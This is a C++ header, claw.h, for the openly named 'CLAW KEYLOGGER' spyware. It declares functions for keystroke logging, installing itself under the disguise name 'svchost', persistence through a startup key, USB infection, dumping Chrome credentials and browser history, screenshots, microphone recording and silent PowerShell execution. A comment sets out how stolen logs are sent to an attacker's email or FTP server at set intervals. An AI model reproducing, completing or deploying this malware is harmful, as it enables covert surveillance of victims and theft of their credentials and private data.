/*

Author: Fahad (QuantumCore)

https://github.com/quantumcore
https://quantumcored.com

claw.h (c) 2020

CLAW KEYLOGGER
*/

//====================
#ifndef Claw_C
#define Claw_C

#include <algorithm>
#include <string>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <limits>
#include <tchar.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <ctime>
#include <gdiplus.h>
#include <wininet.h>
//====================

#define UNLEN 256

//====================
// Threads
DWORD WINAPI NOTIFIER(LPVOID lpParameter);
DWORD WINAPI USBINFECT(LPVOID lpParameter);
//====================

class Claw {
	public:

	std::string DELIVERY_USER = ""; // the Delivery Username / Email
	std::string DELIVERY_PASS = ""; // the Delivery Password
	std::string FTP_SERVER = ""; // FTP Server (if used)
	std::string INSTALL_NAME = ""; // The name to infect the pc as
	std::string strTimeInterval = ""; // Time interval to send logs
	std::string DELIVERY_METHOD = ""; // Delivery method, ftp or smtp
	std::string MIC_OPTION = ""; // To Record Mic or not
	std::string HQ = ""; // HQ is the Install location
	std::string SCREENSHOTFILENAME; // 1st Screenshot filename 
	std::string SECONDSCREENSHOT; // 2nd Screenshot filename
	std::string MICFILENAME; // Mic Recording filename

	unsigned int TIME_INTERVAL = 0; // The time interval string, On line 39, is later converted to unsigned int, Stored here.
	WIN32_FIND_DATA data; 

	std::string random_string( size_t length ); // returns random string 
	//============================
	std::string initial_install_directory(); // Returns Initial Install directory
	//============================
	void copyFile(const char* source, const char* dest); // Copy file
	//============================
	void _infect(); // Infect the system
	//============================
	void StartupKey(const char* czExePath); // Add to Startup
	//============================   
	std::string Dir(); // Get Current Directory
	//============================
	void replaceAll( std::string &s, const std::string &search, const std::string &replace ); // This function is used 
	// To replace all instances of a string in an another string.
	//============================
	bool SendMail(std::string message, std::string subject); // Send Email
	//============================
	void split(char* src, char* dest[5],  const char* delimeter) ; // Split string, C style.
	//============================
	void ProcessDelivery(); // Log Delivery Processing
	//============================
	std::string MyLocation(); // Returns Location of Claw Keylogger
	//============================
	std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos); // ignores a line being read from a file.
	//============================
	std::string getLastLine(std::ifstream& in); // Gets the Last line of the file
	//============================


	/*
	Gets Keylogger Reqiured INFORMATION. 

	Information is written in the EXE at the End of File. 
	This function, Reads the last line and loads the information required. 
	Claw cannot run without it. 
	Information format : (protocol)[](server/email)[](password)[](install_name)[](time_interval)[](mic_option) 
	Example : 

	smtp[]mygmail@gmail.com[]mygmailpassword[]svchost[]300000[]1  
		|- Sends Logs to Email on mygmail@gmail.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, With Mic Recording.

	ftp[]myserver.com,username[]myftpserverpass[]svchost[]300000[]0
		|- Sends Logs to FTP on myserver.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, Without Mic Recording.
		|- see claw.cpp line 399 for details on ftp innformaton parsing

	This information is split into an array using '[]' as it's delimeter.
	Delimeter can be changed, It should be something that must not be in any other setting as it will be split too. 
	The current delimeter is recommended to not be changed. 

	Time Intervals that Claw uses are 300000ms (5 minutes), 600000ms (10 minutes), and 900000 (15 minutes) 
	
	*/
	std::string GetKeyLoggerInformation(); 
	//============================
	DWORD ProcessId(LPCTSTR ProcessName); // GET PID of a Process by Name
	//============================
	BOOL isFile(const char* file); // Check if a file exists, Returns TRUE if it does, FALSE if it does not.
	//============================
	std::string readFileContents(const char* file); // Returns the contents of a file.
	//============================
	std::string ExecuteOutFile(const char* command, const char* output_filename); // Execute a PS Command and Redirect output to file.
	//============================
	void ExecuteSilent(const char* command); // Execute a PS Command Silently
	//============================
	void ExecuteCommandPrompt(const char* command); // Execute a Command in CMD.
	//============================
	std::string DumpChromeCredentials(); // Dump Google Chrome Credentials
	//============================
	void DumpBrowserHistory(); // Dump Browser history
	//============================
	bool hookShift(); // Get shift status
	//============================
	bool capsLock(); // Get capslock status
	//============================
	int filter(int key); // Filters keys
	//============================
	void Keylogger(); // The Keylogger
	//============================
	std::string KeylogFileName(); // returns Keylogger filename
	//===========================
	std::string WindowStamp(); // returns Window Name + Timestamp
	//===========================
	void ScreenShot(std::string JPEG_FILENAME); // Takes Screenshot of the Entire Screen.
	//===========================
	std::string WANIP(); // Returns WAN IP Address
	//===========================
	std::string UserPC(); // Returns User / PC.
	//===========================
	void RecordMic(); // Records Mic.
};



#endif // ! Claw